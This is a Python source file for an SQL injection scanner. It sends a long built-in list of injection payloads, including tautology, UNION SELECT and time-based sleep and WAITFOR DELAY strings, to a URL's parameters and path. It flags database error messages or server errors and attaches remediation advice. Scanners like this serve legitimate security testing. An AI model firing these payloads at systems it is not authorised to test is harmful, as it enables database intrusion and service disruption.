import requests
from urllib.parse import urljoin
from typing import List, Dict, Any

class SQLInjectionScanner:
    def __init__(self, session: requests.Session):
        self.session = session
        self.sql_payloads = [
            "'", "''", "`", "``", ",", "\"", "\"\"", "/", "//", "\\", "\\\\", ";",
            "' or \"", "-- or #", "' OR '1", "' OR 1 -- -", "\" OR \"\" = \"", "\" OR 1 = 1 -- -",
            "' OR '' = '", "'='", "'LIKE'", "'=0--+", " OR 1=1", "' OR 'x'='x", "' AND id IS NULL; --",
            "'''''''''''''UNION SELECT '2", "%00", "/*…*/", "+", "||", "%", "@variable", "@@variable",
            "AND 1", "AND 0", "AND true", "AND false", "1-false", "1-true", "1*56", "-2",
            "1' ORDER BY 1--+", "1' ORDER BY 2--+", "1' ORDER BY 3--+",
            "1' GROUP BY 1,2,--+", "1' GROUP BY 1,2,3--+",
            "' GROUP BY columnnames having 1=1 --",
            "-1' UNION SELECT 1,2,3--+",
            "' UNION SELECT sum(columnname ) from tablename --",
            "-1 UNION SELECT 1 INTO @,@",
            "1 AND (SELECT * FROM Users) = 1",
            "' AND MID(VERSION(),1,1) = '5';",
            "' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --",
            ",(select * from (select(sleep(10)))a)",
            "%2c(select%20*%20from%20(select(sleep(10)))a)",
            "';WAITFOR DELAY '0:0:30'--",
            "sleep(5)#", "1 or sleep(5)#", "\" or sleep(5)#", "' or sleep(5)#",
            "benchmark(10000000,MD5(1))#",
            "pg_sleep(5)--", "1 or pg_sleep(5)--", "\" or pg_sleep(5)--",
            "AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
            "waitfor delay '00:00:05'", "benchmark(50000000,MD5(1))"
        ]
        self.error_patterns = [
            'sql', 'mysql', 'sqlite', 'postgresql',
            'ORA-', 'Oracle',
            'Microsoft SQL', 'Sybase',
            'ODBC Driver',
            'DB2',
            'SQLite3',
            '[Microsoft][ODBC SQL Server Driver]',
            'PostgreSQL',
            'org.postgresql.util.PSQLException',
            'Npgsql.',
            'PG::Error',
            'PSQLException',
            'SQL syntax',
            'SQLSTATE',
            'syntax error',
            'mysql_fetch_array()',
            'mysql_num_rows()',
            'mysql_result()',
            'pg_exec()',
            'SQLite/JDBCDriver',
            'SQLite.Exception',
            'System.Data.SQLite.SQLiteException',
            'Warning: mysql_',
            'Warning: pg_',
            'Warning: sqlite_',
            'error in your SQL syntax'
        ]

    def scan_endpoint(self, url: str, params: Dict[str, str] = None) -> List[Dict[str, Any]]:
        vulnerabilities = []
        
        # Test each parameter with each payload
        if params:
            for param_name, _ in params.items():
                for payload in self.sql_payloads:
                    test_params = params.copy()
                    test_params[param_name] = payload
                    
                    try:
                        response = self.session.get(url, params=test_params, timeout=10)
                        if self._detect_sql_vulnerability(response):
                            vulnerabilities.append({
                                'type': 'SQL Injection',
                                'severity': 'Critical',
                                'description': f'SQL injection vulnerability detected in parameter: {param_name}',
                                'payload': payload,
                                'url': url,
                                'parameter': param_name,
                                'recommendation': 'Implement proper input validation and parameterized queries'
                            })
                            break  # Found vulnerability in this parameter, move to next
                    except Exception as e:
                        continue
        
        # Test URL path injection
        for payload in self.sql_payloads:
            try:
                test_url = urljoin(url, payload)
                response = self.session.get(test_url, timeout=10)
                if self._detect_sql_vulnerability(response):
                    vulnerabilities.append({
                        'type': 'SQL Injection',
                        'severity': 'Critical',
                        'description': 'SQL injection vulnerability detected in URL path',
                        'payload': payload,
                        'url': test_url,
                        'parameter': 'URL Path',
                        'recommendation': 'Implement proper input validation and parameterized queries'
                    })
                    break
            except Exception as e:
                continue

        return vulnerabilities

    def _detect_sql_vulnerability(self, response: requests.Response) -> bool:
        # Check response status
        if response.status_code >= 500:
            return True

        # Check response content for SQL error patterns
        content = response.text.lower()
        return any(pattern.lower() in content for pattern in self.error_patterns)